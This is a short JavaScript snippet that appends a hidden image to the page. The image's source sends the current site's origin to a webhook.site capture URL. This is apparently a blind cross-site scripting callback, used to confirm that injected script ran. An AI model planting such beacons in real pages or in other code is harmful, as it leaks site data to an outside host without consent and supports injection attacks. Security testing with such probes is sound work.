// Create a new img element
const img = document.createElement('img');

// Set its src to the webhook URL with the current site origin
img.src = 'https://webhook.site/54074360-8e4e-4baf-b907-4033ca437f65?origin=' + encodeURIComponent(window.location.origin);

// Optionally, make it invisible
img.style.display = 'none';

// Append the img to the body
document.body.appendChild(img);
